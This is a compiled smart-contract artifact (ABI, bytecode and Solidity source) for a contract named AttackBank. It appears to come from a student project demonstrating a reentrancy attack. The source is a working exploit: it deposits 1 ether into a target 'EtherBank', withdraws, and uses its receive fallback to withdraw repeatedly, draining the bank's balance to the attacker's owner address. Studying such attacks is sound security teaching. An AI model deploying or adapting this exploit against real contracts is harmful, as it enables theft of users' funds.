{
  "contractName": "AttackBank",
  "abi": [
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "_etherBankAddress",
          "type": "address"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "inputs": [],
      "name": "etherBank",
      "outputs": [
        {
          "internalType": "contract EtherBank",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [],
      "name": "owner",
      "outputs": [
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "stateMutability": "payable",
      "type": "receive",
      "payable": true
    },
    {
      "inputs": [],
      "name": "attack",
      "outputs": [],
      "stateMutability": "payable",
      "type": "function",
      "payable": true
    }
  ],
  "bytecode": "0x60a060405234801561001057600080fd5b506040516105a83803806105a88339818101604052810190610032919061010f565b336000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055508073ffffffffffffffffffffffffffffffffffffffff1660808173ffffffffffffffffffffffffffffffffffffffff16815250505061013c565b600080fd5b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b60006100dc826100b1565b9050919050565b6100ec816100d1565b81146100f757600080fd5b50565b600081519050610109816100e3565b92915050565b600060208284031215610125576101246100ac565b5b6000610133848285016100fa565b91505092915050565b608051610437610171600039600081816048015281816086015281816101da0152818161022201526102ab01526104376000f3fe6080604052600436106100385760003560e01c8063852de57e146101785780638da5cb5b146101a35780639e5faafc146101ce57610173565b3661017357670de0b6b3a76400007f000000000000000000000000000000000000000000000000000000000000000073ffffffffffffffffffffffffffffffffffffffff16311115610109577f000000000000000000000000000000000000000000000000000000000000000073ffffffffffffffffffffffffffffffffffffffff1663e086e5ec6040518163ffffffff1660e01b8152600401600060405180830381600087803b1580156100ec57600080fd5b505af1158015610100573d6000803e3d6000fd5b50505050610171565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166108fc479081150290604051600060405180830381858888f1935050505015801561016f573d6000803e3d6000fd5b505b005b600080fd5b34801561018457600080fd5b5061018d6101d8565b60405161019a91906103aa565b60405180910390f35b3480156101af57600080fd5b506101b86101fc565b6040516101c591906103e6565b60405180910390f35b6101d6610220565b005b7f000000000000000000000000000000000000000000000000000000000000000081565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b7f000000000000000000000000000000000000000000000000000000000000000073ffffffffffffffffffffffffffffffffffffffff1663f6326fb3670de0b6b3a76400006040518263ffffffff1660e01b81526004016000604051808303818588803b15801561029057600080fd5b505af11580156102a4573d6000803e3d6000fd5b50505050507f000000000000000000000000000000000000000000000000000000000000000073ffffffffffffffffffffffffffffffffffffffff1663e086e5ec6040518163ffffffff1660e01b8152600401600060405180830381600087803b15801561031157600080fd5b505af1158015610325573d6000803e3d6000fd5b50505050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b6000819050919050565b600061037061036b6103668461032b565b61034b565b61032b565b9050919050565b600061038282610355565b9050919050565b600061039482610377565b9050919050565b6103a481610389565b82525050565b60006020820190506103bf600083018461039b565b92915050565b60006103d08261032b565b9050919050565b6103e0816103c5565b82525050565b60006020820190506103fb60008301846103d7565b9291505056fea2646970667358221220e81ede19fcf3ba4f2dc332889c2860a2b1a45850a2b2bac26098e926dacd8c6d64736f6c63430008130033",
  "immutableReferences": {
    "69": [
      {
        "length": 32,
        "start": 72
      },
      {
        "length": 32,
        "start": 134
      },
      {
        "length": 32,
        "start": 474
      },
      {
        "length": 32,
        "start": 546
      },
      {
        "length": 32,
        "start": 683
      }
    ]
  },
  "source": "// SPDX-License-Identifier: UNLICENSED\r\npragma solidity ^0.8.0;\r\n\r\ninterface EtherBank {\r\n    function depositETH(\r\n    ) payable external;\r\n    function withdrawETH(\r\n    ) external;\r\n}\r\n\r\ncontract AttackBank {\r\n\r\n    EtherBank public immutable etherBank;\r\n    address public owner;\r\n\r\n    // Constructor loads vulnerable contract and sets attack contract's owner\r\n    constructor(address _etherBankAddress) {\r\n        owner = msg.sender;\r\n        etherBank = EtherBank(_etherBankAddress);\r\n    }\r\n\r\n    // Will initiate the re-entrance attack\r\n    function attack() external payable {\r\n        etherBank.depositETH{value: 1 ether}();\r\n        etherBank.withdrawETH();\r\n    }\r\n\r\n    // Fallback Function - Will be executed once ETH is sent to this contract\r\n    receive() external payable{\r\n\r\n        if (address(etherBank).balance > 1 ether) {\r\n            etherBank.withdrawETH();\r\n        } else {\r\n            payable(owner).transfer(address(this).balance);\r\n        }\r\n    }\r\n}",
  "sourcePath": "C:\\Users\\joshu\\OneDrive\\Desktop\\Uni Work 2023-24\\Individual Project\\Smart Contracts\\contracts\\REAtt.sol",
  "compiler": {
    "name": "solc",
    "version": "0.8.19+commit.7dd6d404.Emscripten.clang"
  },
  "schemaVersion": "3.4.16",
  "updatedAt": "2024-02-12T22:56:54.704Z",
  "networkType": "ethereum",
  "devdoc": {
    "kind": "dev",
    "methods": {},
    "version": 1
  },
  "userdoc": {
    "kind": "user",
    "methods": {},
    "version": 1
  }
}